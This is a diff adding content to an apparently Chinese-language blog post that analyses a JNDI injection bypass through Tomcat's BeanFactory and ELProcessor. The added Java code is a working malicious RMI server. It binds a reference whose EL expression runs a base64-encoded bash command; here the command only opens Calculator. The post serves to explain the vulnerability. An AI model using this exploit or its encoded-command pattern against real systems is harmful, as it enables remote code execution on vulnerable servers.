@@ -248,7 +248,31 @@
               可以看到最后一个参数为null，最后一个参数根据idea显示是factoryLocation参数，使得var8.getFactoryClassLocation()为空。</p>
               
               <div>
-                
+              	
+<pre class='hljs'><code><span class="hljs-keyword">import</span> com.sun.jndi.rmi.registry.<span class="hljs-type">ReferenceWrapper</span>;
+<span class="hljs-keyword">import</span> org.apache.naming.<span class="hljs-type">ResourceRef</span>;
+
+<span class="hljs-keyword">import</span> javax.naming.<span class="hljs-type">NamingException</span>;
+<span class="hljs-keyword">import</span> javax.naming.<span class="hljs-type">StringRefAddr</span>;
+<span class="hljs-keyword">import</span> java.rmi.<span class="hljs-type">AlreadyBoundException</span>;
+<span class="hljs-keyword">import</span> java.rmi.<span class="hljs-type">RemoteException</span>;
+<span class="hljs-keyword">import</span> java.rmi.registry.<span class="hljs-type">LocateRegistry</span>;
+<span class="hljs-keyword">import</span> java.rmi.registry.<span class="hljs-type">Registry</span>;
+
+public class <span class="hljs-type">BypassCodebase</span> {
+    public <span class="hljs-keyword">static</span> <span class="hljs-type">void</span> main(<span class="hljs-type">String</span>[] args) throws <span class="hljs-type">RemoteException</span>, <span class="hljs-type">NamingException</span>, <span class="hljs-type">AlreadyBoundException</span> {
+        <span class="hljs-type">Registry</span> registry = <span class="hljs-type">LocateRegistry</span>.createRegistry(<span class="hljs-number">1099</span>);
+        // 实例化<span class="hljs-type">Reference</span>，指定目标类为javax.el.<span class="hljs-type">ELProcessor</span>，工厂类为org.apache.naming.factory.<span class="hljs-type">BeanFactory</span>，最后一个参数是factoryLocation，为空时即可使得var8.getFactoryClassLocation()为空。
+        <span class="hljs-type">ResourceRef</span> <span class="hljs-keyword">ref</span> = new <span class="hljs-type">ResourceRef</span>(<span class="hljs-string">"javax.el.ELProcessor"</span>, null, <span class="hljs-string">""</span>, <span class="hljs-string">""</span>, <span class="hljs-literal">true</span>,<span class="hljs-string">"org.apache.naming.factory.BeanFactory"</span>,null);
+        // <span class="hljs-type">BeanFactory</span>.getObjectInstance 代码中获取forceString的值截取等于号后的内容作为调用的方法
+        <span class="hljs-keyword">ref</span>.add(new <span class="hljs-type">StringRefAddr</span>(<span class="hljs-string">"forceString"</span>, <span class="hljs-string">"pwn=eval"</span>));
+        // 利用表达式执行命令
+        <span class="hljs-keyword">ref</span>.add(new <span class="hljs-type">StringRefAddr</span>(<span class="hljs-string">"pwn"</span>, <span class="hljs-string">"\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/bash','-c','{echo,b3BlbiAvU3lzdGVtL0FwcGxpY2F0aW9ucy9DYWxjdWxhdG9yLmFwcA==}|{base64,-d}|{bash,-i}']).start()\")"</span>));
+        <span class="hljs-type">ReferenceWrapper</span> referenceWrapper = new <span class="hljs-type">ReferenceWrapper</span>(<span class="hljs-keyword">ref</span>);
+        registry.<span class="hljs-keyword">bind</span>(<span class="hljs-string">"evilObject"</span>, referenceWrapper);
+    }
+}
+</code></pre>                
                 
                 
               </div>
@@ -296,14 +320,14 @@
                 <img class="img-fluid" src="../img/2022-3-27/2-9.jpg" alt="">
               </a>
               
-
-
-
-
-
-
-
+              <p>&nbsp;&nbsp;&nbsp;接下来就是反射调用获取到的eval方法，并向里面传入构造的恶意表达式，这也是第二个ref.add添加的内容，
+              恶意表达式通过(String)ra.getContent()获取并传入到valueArray数组内，传参反射调用eval方法执行恶意代码。</p>
               
+              
+              <a data-fancybox="gallery" href="../img/2022-3-27/2-10.jpg">
+                <img class="img-fluid" src="../img/2022-3-27/2-10.jpg" alt="">
+              </a>
+
 
 
               
